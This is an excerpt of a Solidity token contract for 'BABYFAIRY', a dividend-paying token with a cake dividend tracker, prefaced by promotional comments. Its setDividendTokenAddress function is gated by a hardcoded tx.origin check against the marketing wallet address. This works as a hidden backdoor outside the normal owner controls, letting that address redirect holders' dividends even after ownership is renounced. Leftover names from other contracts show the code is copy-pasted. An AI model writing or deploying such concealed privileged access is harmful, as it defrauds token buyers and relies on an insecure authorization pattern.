...
/*      Firtly welcome, you made to the right contract haha, dont give anything to these other fakes. 
        We were the 1st and nobody can take that!
...
BABY FAIRY - GOOD LUCK COPYING UNLESS U DAMN GOOD - DLFJNGDFD SH49834937KUYG78878G87G4667382KJDKJJLJKBD; 
...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xD6cfeB9BB5dE2d642412CF6C67205F3aA18e7d9f, "Only owner can change dividend contract address");
...
contract BABYFAIRYOfficial is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("BABYFAIRY", "BABYFAIRY") {
    	cakeDividendTracker = new CakeDividendTracker();


    	marketingWallet = 0xD6cfeB9BB5dE2d642412CF6C67205F3aA18e7d9f;
    ...
    function tradeStart() external onlyOwner {
        ...
        maxWalletToken = 150000000000 * (10**18);
    }
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "Babycakeback: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "Babycakeback: The new dividend tracker must be owned by the Babycakeback token contract");
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("Babycakeback_Dividend_Tracker", "Babycakeback_Dividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
    	claimWait = 1200;
        minimumTokenBalanceForDividends = 150000 * (10**18); //must hold 150,000+++ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "Babycakeback_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "Babycakeback_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1200 && newClaimWait <= 86400, "Babycakeback_Dividend_Tracker: claimWait" );
        require(newClaimWait != claimWait, "Babycakeback_Dividend_Tracker: Cannot update claimWait to same value");
